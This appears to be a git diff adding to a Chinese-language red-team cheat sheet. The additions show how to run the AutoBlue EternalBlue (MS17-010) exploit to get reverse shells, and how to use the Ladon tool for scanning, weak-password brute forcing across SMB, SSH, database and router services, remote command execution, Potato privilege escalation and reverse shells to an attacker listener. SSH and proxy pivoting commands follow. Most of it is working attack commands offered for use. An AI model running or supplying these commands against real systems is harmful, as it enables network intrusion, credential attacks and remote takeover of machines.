@@ -32,6 +32,120 @@ nc -l -p 8888 -c "nc 192.168.19.153 22"
 ```bash
 while :; do (nc -l -p 8888 -c "nc 192.168.19.153 22"); done
 ```
+### 17-010: AutoBlue-MS17-010
+[​MS17010打法](https://mp.weixin.qq.com/s/UM7frymXiyTEvrJC3wNMYw) [L1](https://www.youtube.com/watch?v=p9OnxS1oDc0) [L2](https://www.youtube.com/watch?v=_uLJB_Ys120&t=688s)
+
+```shell
+./shell_prep.sh
+
+# 普通反弹shell, 成功率较高
+LHOST for reverse connection:
+192.168.183.231
+LPORT you want x64 to listen on:
+1234
+LPORT you want x86 to listen on:
+1234
+Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
+1
+Type 0 to generate a staged payload or 1 to generate a stageless payload
+1
+
+## 攻击机
+nc -lvvp 1234
+
+## 新终端 执行, 稍等2秒, 没效果再执行, 直到反弹成功
+python eternalblue_exploit7.py 192.168.183.128 shellcode/sc_x64.bin
+## 如果是meterpreter, 要用sc_x64_msf.bin, 成功率不高
+python eternalblue_exploit7.py 192.168.183.128 shellcode/sc_x64_msf.bin
+```
+
+```shell
+# server2003_win xp 
+python2 checker.py ip 
+python2 zzz_exploit.py ip 
+
+# server2008_win7 
+x86 推荐使用 
+python2 eternalblue_exploit7.py ip shellcode/msfexecx86.bin 
+# x64 推荐使用 
+python2 eternalblue_exploit7.py ip shellcode/sc_all.bin
+
+# server2012_win8.1+ 
+python2 eternalblue_exploit8.py ip shellcode/sc_all.bin
+```
+### Ladon
+[Usage](https://github.com/k8gege/Ladon/wiki/Ladon-Usage)
+
+检测
+```shell
+Ladon 192.168.1.8 MS17010
+Ladon 192.168.1.8/24 MS17010
+Ladon 192.168.1.8/c MS17010
+Ladon 192.168.1.50-192.168.1.200 ICMP
+Ladon ip24.txt ICMP
+Ladon 192.168.1.8 WhatCMS # 扫描IP
+Ladon noping 192.168.1.8 WhatCMS # 扫描IP 禁PING扫描
+```
+
+正向代理Socks5
+```shell
+Ladon Socks5 192.168.1.8 1080
+```
+
+使用 proxifier 代理扫描, 代理工具不支持ICMP，必须加noping
+
+```sh
+Ladon noping 10.1.2.8/24 MS17010
+```
+
+[密码爆破](http://k8gege.org/Ladon/sshscan.html)
+
+```shell
+# 扫描C段445端口Windows机器弱口令
+Ladon 192.168.1.8/24 SmbScan
+Ladon 192.168.1.8/24 SshScan
+Ladon 192.168.1.8/24 FtpScan
+Ladon 192.168.1.8/24 MysqlScan
+# 扫描C段1521端口Oracle服务器弱口令
+Ladon 192.168.1.8/24 OracleScan
+
+# 扫描C段27017端口MongoDB服务器弱口令
+Ladon 192.168.1.8/24 MongodbScan
+
+# 扫描C段1521端口Oracle服务器弱口令
+Ladon 192.168.1.8/24 SqlplusScan
+
+# 扫描C段5985端口Winrm服务器弱口令
+Ladon 192.168.1.8/24 WinrmScan
+Ladon 192.168.1.8/24 RedisScan
+
+# 扫描C段8728端口RouterOS路由器
+Ladon 192.168.1.8/24 RouterOSScan
+```
+5、远程命令执行
+```shell
+Ladon SshCmd host port user pass cmd
+Ladon WinrmCmd host port user pass cmd
+Ladon PhpShell url pass cmd
+Ladon PhpStudyDoor url cmd
+```
+
+Potato 提权
+```shell
+Ladon SweetPotato whoami # win7,2012r2
+Ladon SweetPotato shell.exe
+Ladon badpotato # win8
+```
+
+[反弹shell](http://k8gege.org/Ladon/ReverseShell.html)
+```shell
+# 反弹 NC shell
+Ladon ReverseTcp 192.168.1.8 4444 nc
+# 反弹MSF TCP Shell
+Ladon ReverseTcp 192.168.1.8 4444 shell
+# 反弹MSF TCP Meter
+Ladon ReverseTcp 192.168.1.8 4444 meter
+```
 
 # proxy
 ## proxychains
@@ -58,6 +172,18 @@ remote_port = 8000 # 本地1234启动http-server 远程访问 192.168.50.161:808
 
 ```shell
 proxy.exe http -t tcp -p "0.0.0.0:8080" --daemon
+
+# 二级代理HTTP: 使用本地端口8090，假设上级HTTP代理是22.22.22.22:8080
+proxy http -t tcp -p "0.0.0.0:8090" -T tcp -P "22.22.22.22:8080"
+
+# 一级TCP: 本地33080端口就是访问192.168.22.33的22端口。
+proxy tcp -p ":33080" -T tcp -P "192.168.22.33:22"
+# 二级TCP: 本地23080端口就是访问22.22.22.33的8080端口。
+## VPS(IP:22.22.22.33)执行:
+proxy tcp -p ":33080" -T tcp -P "127.0.0.1:8080"
+## 本地执行:
+proxy tcp -p ":23080" -T tcp -P "22.22.22.33:33080"
+
 ```
 ## ssh
 
@@ -66,11 +192,13 @@ proxy.exe http -t tcp -p "0.0.0.0:8080" --daemon
 
 1.SSH远程端口转发
 ```shell
+# 示例1
 useradd tunneluser -m -d/home/tunneluser -s/bin/true
 passwd tunneluser
 ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N # 跳板机1.1.1.1 将3389 转发到 内网 3.3.3.3:3389
-# 攻击者
+## 攻击者
 attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPasswd
+
 ```
 
 ![](https://s2.loli.net/2022/12/31/IAcaVtw671PUevX.jpg)
@@ -85,6 +213,12 @@ PC-1$ ssh tunne1user@1.1.1.1 -L *:80:127.0.0.1:80 -N
 PC-1$ netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
 ```
 
+示例2 开启代理, 通过代理的所有命令从192.168.50.161执行
+```shell
+# 示例 2, -p 指服务器 ssh的端口, 通过
+ssh -f -N -D 127.0.0.1:1080 ubuntu@192.168.50.161 -p 2222
+```
+
 3. 动态端口转和sock
 如果目标没有ssh服务器, 以下命令开启代理
 ```shell
@@ -92,6 +226,13 @@ PC-1$ ssh tunneluser@1.1.1.1 -R 9050 -N
 # 配合proxychians
 socks4 127.0.0.1 9050
 ```
+
+| Args | Desc                             |
+| ---- | -------------------------------- |
+| -f   | 后台运行                         |
+| -N   | 不执行远程命令，只进行端口转发   |
+| -D   | SOCKS 代理的端口                 |
+
 ## socat 端口转发
 
 有时不行换frp
